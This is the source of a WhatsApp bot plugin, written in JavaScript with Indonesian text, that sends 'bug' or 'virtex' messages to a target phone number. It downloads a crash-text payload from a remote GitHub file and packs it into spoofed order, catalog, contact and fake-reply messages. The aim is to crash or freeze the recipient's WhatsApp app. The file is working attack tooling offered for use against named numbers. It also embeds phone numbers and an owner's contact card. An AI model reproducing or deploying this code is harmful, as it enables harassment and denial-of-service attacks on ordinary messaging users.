import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'
const {
 generateWAMessageFromContent,
 proto,
 prepareWAMessageMedia
  } = (await import('@adiwajshing/baileys')).default

let handler = async (m, { conn, args, text, command, usedPrefix, participants }) => {
	if (!text) throw `Contoh Penggunaan : *${usedPrefix + command}* <nomor>\n\n*Note :*\nGunaka Fitur Hanya Untuk Ripper Atau Scamer`
	let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
	if (!mention) throw 'Masukkan Nomor Atau Tag Orang'
	let thumb = await fs.readFileSync('./thumbnail.jpg')
	let virus = await (await fetch("https://raw.githubusercontent.com/AyGemuy/HinataBot/master/plugins/tools-virtext.js")).text()
	let virus2 = await (await fetch("https://raw.githubusercontent.com/AyGemuy/HinataBot/master/plugins/tools-virtext.js")).text()
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
	let name = await conn.getName(who)
	let sapa = ['Hai', 'Ohayo', 'Kyaa', 'Halo', 'Nyann'].getRandom()
	let pp = await conn.profilePictureUrl(who, 'image').catch(_ => hwaifu.getRandom())
	
    // jpegThumbnail
    let sipp = await conn.resize(pp, 150, 150)
    
	let type = (args[0] || '').toLowerCase()
	let q = ` Tag From ${author}\n${text}`
	
	let sections = [{
		title: `Recoded by ${packname}`,
		rows: [
			{ title: 'PDF', rowId: `${usedPrefix + command} pdf ${mention}` },
			{ title: 'VN', rowId: `${usedPrefix + command} vn ${mention}` },
			{ title: 'Sticker', rowId: `${usedPrefix + command} sticker ${mention}` },
			{ title: 'Image', rowId: `${usedPrefix + command} img ${mention}` },
			{ title: 'Video', rowId: `${usedPrefix + command} vid ${mention}` },
			{ title: 'Crash', rowId: `${usedPrefix + command} crash ${mention}` },
			{ title: 'Kontak', rowId: `${usedPrefix + command} kontak ${mention}` },
			{ title: 'ReactPc', rowId: `${usedPrefix + command} reactpc ${mention}` },		
			{ title: 'Catalog', rowId: `${usedPrefix + command} catalog ${mention}` },
			{ title: 'TextCrash', rowId: `${usedPrefix + command} textcrash ${mention}` },
		]
	}]
	let listMessage = {
		text: '*[ List  ]*\n\n*Note :* Jangan Gunakan Secara Sembarangan',
		footer: packname,
		buttonText: 'Silahkan Klik Di Sini',
		sections
	}
	
	// Kal
	let kal = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				extendedTextMessage: {
					text: '👋 ' + sapa + ' Kak :> ' + name,
					title: botdate,
					jpegThumbnail: sipp
				}
			}
		}
	// Troli
	let trol = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					itemCount: fsizedoc,
					status: 1,
					surface: 1,
					message: virus,
					orderTitle: virus,
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
	//Troli 2
	let ftrolii = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					itemCount: fsizedoc,
					status: 1,
					surface: 1,
					message: virus2,
					orderTitle: virus2,
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
	// Sticker
	let bugstik = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					itemCount: fsizedoc,
					status: 1,
					surface: 1,
					message: virus2,
					orderTitle: virus2,
					sellerJid: '0@s.whatsapp.net'
				}
			}
		}
	// Pdf
	let bugpdf = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				imageMessage: {
					title: author,
					h: 'Hmm',
					seconds: fsizedoc,
					caption: '👋 ' + sapa + ' Kak :> ' + name,
					jpegThumbnail: sipp
				}
			}
		}
	// Vn
	let adehvn = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				locationMessage: {
					
				}
			}
		}
	// Image
	let bugimage = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				audioMessage: {
					mimetype: 'audio/ogg; codecs=opus',
					seconds: fsizedoc,
					ptt: true
				}
			}
		}
	// Catalog
	let messa = await prepareWAMessageMedia({ image: await fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
	let catalog = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
		"productMessage": {
		"product": {
			"productImage": messa.imageMessage,
			"productId": "4383282311765462",
			"title": packname,
			"description": virus2,
			"currencyCode": "IDR",
			"bodyText": virus,
			"footerText": packname,
			"priceAmount1000": fsizedoc,
			"productImageCount": 1,
			"firstImageId": 1,
			"salePriceAmount1000": fsizedoc,
			"retailerId": packname,
			"url": "wa.me/62881037044211"
		},
			"businessOwnerJid": "62881037044211@s.whatsapp.net",
		}
	}), { userJid: m.chat, quoted: ftrolii })
	// Contact
	let fkontaak = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				contactMessage: {
					displayName: virus2,
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${author},;;;\nFN:${author},\nitem1.TEL;waid=${who.split('@')[0]}:${who.split('@')[0]}\nitem1.X-ABLabell:Ponsel\nEND:VCARD`,
					jpegThumbnail: sipp,
					thumbnail: sipp,
					sendEphemeral: true
				}
			}
		}
	// Text
	let main = {
			key: {
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				imageMessage: {
					title: author,
					h: 'Hmm',
					seconds: fsizedoc,
					caption: '👋 ' + sapa + ' Kak :> ' + name,
					jpegThumbnail: sipp
				}
			}
		}
	// BATAS
	let sukses = `Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`
	switch (type) {
		case 'vn':
			conn.sendMessage(mention, {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
			throw sukses
		break
		case 'pdf':
			conn.sendMessage(mention, {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
			throw sukses
		break
		case 'sticker':
			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
			conn.sendFile(mention, stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
			throw sukses
		break
		case 'img':
			conn.sendMessage(mention, {image: thumb, bugimage }, {quoted: bugimage})
			throw sukses
		break
		case 'crash':
			conn.fakeReply(mention, 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(mention, 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(mention, 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(mention, 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(mention, 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
			conn.fakeReply(mention, 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			throw sukses
		break
		case 'kontak':
			let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp;Saya Owner Hinata;Bot;;Md\nFN:Saya Owner Hinata Bot WhatsApp, Md\nNICKNAME:👑 Owner Hinata Bot\nORG:Wudy\nTITLE:soft\nitem1.TEL;waid=6282195322106:+62 821-9532-2106\nitem1.X-ABLabel:📞 Nomor Owner\nitem2.URL:https://s.id/Cerdasin62\nitem2.X-ABLabel:💬 More\nitem3.EMAIL;type=INTERNET:wudysoft@mail.com\nitem3.X-ABLabel:💌 Mail Owner HinataBot\nitem4.ADR:;;🇮🇩 Indonesia;;;;\nitem4.X-ABADR:💬 More\nitem4.X-ABLabel:📍 Lokasi Saya\nBDAY;value=date:🔖 13 January 2001\nEND:VCARD`
			conn.sendMessage(m.chat, { contacts: { displayName: wm, contacts: [{ vcard }] }}, { quoted: fkontaak })
			throw sukses
		break
		case 'reactpc':
			conn.sendMessage(mention, {text: packname }, {quoted: trol})
			throw sukses
		break
		case 'tag':
			if (!m.isGroup) return global.dfail('group',m,conn)
			conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
			throw sukses
		break
		case 'catalog':
			conn.relayMessage(mention, catalog.message, { messageId: catalog.key.id })
			throw sukses
		break
		case 'textcrash':
			conn.reply(mention, packname, main)
			throw sukses
		break
		case 'vid':
			conn.sendMessage(mention, {video: thumb, bugimage, }, {quoted: bugimage})
			throw sukses
		break
		default:
			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, { quoted: fakes })
      throw false
	}
	
}
handler.help = ['sendbug']
handler.tags = ['owner']
handler.command = /^send(virtex|crash|bug)$/i

handler.owner = true

export default handler